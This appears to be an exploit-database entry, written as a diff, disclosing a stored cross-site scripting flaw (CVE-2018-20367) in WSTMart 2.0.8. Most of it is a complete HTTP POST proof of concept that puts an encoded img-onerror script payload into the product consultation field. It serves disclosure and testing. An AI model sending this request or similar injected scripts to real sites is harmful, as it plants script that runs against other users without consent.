@@ -1,0 +1,25 @@
+# Exploit Title: WSTMart 2.0.8 - Cross-Site Scripting
+# Date: 2018-12-23
+# Exploit Author: linfeng
+# Vendor Homepage: https://github.com/wstmall/wstmart/
+# Software Link: http://www.wstmart.net/
+# Version: WSTMart 2.0.8_181212  
+# CVE: CVE-2018-20367
+
+# 0x01 stored XSS (PoC)
+Function point: mall some commodity details - commodity consultation
+poc:
+POST /st/wstmart_v2.0.8_181212/index.php/home/goodsconsult/add.html HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: /
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://xx.xx.xx.xx/st/wstmart_v2.0.8_181212/goods-2.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 83
+Connection: close
+Cookie: PHPSESSID=d1jf7a74dk57sk5jebtg2nckeu; WSTMART_history_goods=think%3A%5B%222%22%2C%2265%22%5D; UM_distinctid=167d5b268981b9-03d665d7d22d54-4c312e7e-100200-167d5b2689945e; CNZZDATA1263804910=767510099-1545475868-%7C1545481454
+
+goodsId=2&consultType=1&consultContent=%3Cimg+src%3Dx+onerror%3Dalert(%2Fxss%2F)%3E
